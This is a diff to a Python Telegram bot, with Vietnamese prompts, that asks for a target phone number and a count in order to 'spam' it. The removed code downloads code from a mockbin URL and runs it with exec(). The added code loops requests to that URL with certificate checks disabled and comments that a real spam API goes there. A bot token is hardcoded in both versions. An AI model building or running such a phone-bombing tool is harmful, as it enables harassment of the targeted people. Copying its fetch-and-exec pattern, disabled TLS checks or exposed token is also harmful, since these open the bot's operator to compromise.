@@ -1,57 +1,45 @@
 from telegram import Update
-from telegram.ext import (
-    ApplicationBuilder, CommandHandler, ContextTypes,
-    ConversationHandler, MessageHandler, filters
-)
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
 import requests
-import asyncio
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
-BOT_TOKEN = '8374042933:AAGmPBOfr_EOxtwVJMdFqziQLAwTZy1I4-Q'  # Token bạn gửi
+# Disable SSL warnings
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
-INPUT_PHONE, INPUT_COUNT = range(2)
+BOT_TOKEN = '8374042933:AAGmPBOfr_EOxtwVJMdFqziQLAwTZy1I4-Q'
+
+# Trạng thái trong luồng hội thoại
+PHONE, COUNT = range(2)
 
 user_data = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Nhập số điện thoại bạn muốn spam:")
-    return INPUT_PHONE
+    await update.message.reply_text("👋 Xin chào! Nhập số điện thoại bạn muốn spam:")
+    return PHONE
 
-async def input_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    phone = update.message.text
-    user_data['phone'] = phone
-    await update.message.reply_text(f"Số điện thoại: {phone}\nNhập số lần muốn spam:")
-    return INPUT_COUNT
+async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_data["phone"] = update.message.text.strip()
+    await update.message.reply_text("✅ Nhập số lần spam:")
+    return COUNT
 
-async def input_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    count_text = update.message.text
-    if not count_text.isdigit():
-        await update.message.reply_text("Vui lòng nhập số nguyên hợp lệ.")
-        return INPUT_COUNT
-    
-    count = int(count_text)
-    user_data['count'] = count
+async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_data["count"] = int(update.message.text.strip())
+    await update.message.reply_text(f"🚀 Bắt đầu spam {user_data['count']} lần vào số {user_data['phone']}...")
 
-    await update.message.reply_text("Đang chạy spam, vui lòng chờ...")
+    # Gọi API theo số lần nhập
+    for i in range(user_data["count"]):
+        try:
+            # Thay link API thực tế tại đây (ví dụ mockbin hoặc API spam bạn đang test)
+            response = requests.get("https://e8dff6c0815f456f991e9fd08f626b99.api.mockbin.io/", verify=False)
+            print(f"[{i+1}] Đã gửi: {response.status_code}")
+        except Exception as e:
+            print(f"[{i+1}] Lỗi: {e}")
 
-    url = "https://e8dff6c0815f456f991e9fd08f626b99.api.mockbin.io/"
-    try:
-        response = requests.get(url)
-        code = response.text
-        
-        exec_globals = {'phone': user_data['phone'], 'count': user_data['count'], 'asyncio': asyncio}
-        exec(code, exec_globals)
-        
-        if 'main' in exec_globals:
-            await exec_globals['main']()
-        
-        await update.message.reply_text("Spam đã chạy xong!")
-    except Exception as e:
-        await update.message.reply_text(f"Lỗi khi chạy spam: {e}")
-
+    await update.message.reply_text("✅ Đã hoàn tất spam!")
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Đã hủy thao tác.")
+    await update.message.reply_text("❌ Đã hủy.")
     return ConversationHandler.END
 
 if __name__ == '__main__':
@@ -60,8 +48,8 @@ if __name__ == '__main__':
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start)],
         states={
-            INPUT_PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, input_phone)],
-            INPUT_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, input_count)],
+            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
+            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
         },
         fallbacks=[CommandHandler('cancel', cancel)]
     )
